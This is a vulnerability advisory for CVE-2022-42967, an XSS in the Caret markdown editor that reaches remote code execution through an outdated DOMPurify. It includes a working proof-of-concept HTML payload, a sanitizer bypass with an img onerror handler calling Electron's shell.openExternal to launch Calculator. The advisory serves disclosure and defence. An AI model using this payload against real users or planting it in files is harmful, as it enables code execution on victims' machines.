---
description: CVE-2022-42967 High severity. XSS in Caret markdown editor leads to remote code execution when viewing crafted Markdown files
title: Caret XSS RCE
date_published: "2023-01-10"
last_updated: "2023-01-10"
xray_id: 
vul_id: CVE-2022-42967
cvss: 7.5
severity: high
discovered_by: Denys Vozniuk
type: vulnerability
---
## Summary
XSS in Caret markdown editor leads to remote code execution when viewing crafted Markdown files

## Component

[Caret Editor](https://caret.io/)

## Affected versions

All versions are affected

## Description

This issue is caused due to insufficient validation of the document data, which is sent to the
Electron renderer.
Specifically, in the `getMarkdownHtmlElement` function in the file
`app.asar/extensions/Markdown/Markdown.js` -

`t.firstChild.innerHTML = DOMPurify.sanitize(r)`

An older version of [DOMPurify](https://github.com/cure53/DOMPurify) is used, which has known filtering bypasses (see below)

## PoC

Opening a document with the following contents, **when preview mode is enabled**, leads to the
immediate execution of an arbitrary process (in this case - Calculator) -

```html
<form><math><mtext></form><form><mglyph><style></math><img src
onerror="try{ const {shell} = require('electron');
shell.openExternal('file:C:/Windows/System32/calc.exe') }catch(e){alert(e)}">
```



## Vulnerability Mitigations

Disable Caret's "Preview Mode"

## References

[NVD](https://nvd.nist.gov/vuln/detail/CVE-2022-42967)